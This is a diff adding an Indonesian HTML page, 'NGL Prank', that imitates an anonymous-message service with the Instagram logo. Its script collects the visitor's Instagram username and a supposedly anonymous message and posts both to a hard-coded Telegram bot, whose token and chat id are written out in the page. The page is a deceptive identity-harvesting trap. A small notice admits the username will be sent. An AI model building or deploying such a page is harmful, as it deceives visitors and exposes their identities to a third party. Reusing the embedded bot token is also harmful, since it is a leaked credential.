@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NGL Prank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #ff5fa2, #ffc371);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      padding: 30px 20px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 100px;
+      margin: 0 auto 20px;
+    }
+
+    .logo img {
+      width: 100%;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 16px;
+      background: #f0f0f0;
+      margin-bottom: 16px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    button {
+      background: #ff5fa2;
+      color: white;
+      font-size: 16px;
+      padding: 14px;
+      border: none;
+      border-radius: 999px;
+      width: 100%;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #e4488f;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #777;
+      margin-top: 15px;
+    }
+
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/ed/Instagram_logo_2022.svg" alt="NGL logo">
+    </div>
+    <h1>Masukkan Username Instagram</h1>
+    <div id="step-1" class="form-step active">
+      <input type="text" id="username" placeholder="Username Instagram kamu" required />
+      <button onclick="nextStep()">Lanjutkan</button>
+    </div>
+    
+    <div id="step-2" class="form-step">
+      <h1>Kirim Pesan Anonim 👀</h1>
+      <textarea id="message" rows="4" placeholder="Tulis pesanmu..." required></textarea>
+      <button onclick="sendMessage()">Kirim Pesan</button>
+    </div>
+    <p class="note">⚠️ Ini hanya prank. Username kamu akan dikirim.</p>
+  </div>
+
+  <script>
+    const token = "7417366472:AAG_H9DxOxGzfkKkMxLx7lAoEgu4z3IwcJg";
+    const chatId = "6128943834";
+    let userUsername = "";
+
+    // Function to handle step transition
+    function nextStep() {
+      userUsername = document.getElementById("username").value.trim();
+      if (userUsername !== "") {
+        document.getElementById("step-1").classList.remove("active");
+        document.getElementById("step-2").classList.add("active");
+      } else {
+        alert("Masukkan username Instagram kamu terlebih dahulu!");
+      }
+    }
+
+    // Function to handle message submission
+    function sendMessage() {
+      const message = document.getElementById("message").value.trim();
+      if (message !== "") {
+        const text = `📨 Pesan Masuk!\n\n👤 Username: ${userUsername}\n💬 Pesan: ${message}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        })
+        .then(res => res.json())
+        .then(data => {
+          alert("Pesan berhasil dikirim!");
+          document.getElementById("username").value = "";
+          document.getElementById("message").value = "";
+          document.getElementById("step-2").classList.remove("active");
+          document.getElementById("step-1").classList.add("active");
+        })
+        .catch(err => {
+          alert("Gagal mengirim pesan. Coba lagi.");
+        });
+      } else {
+        alert("Pesan tidak boleh kosong!");
+      }
+    }
+  </script>
+</body>
+</html>
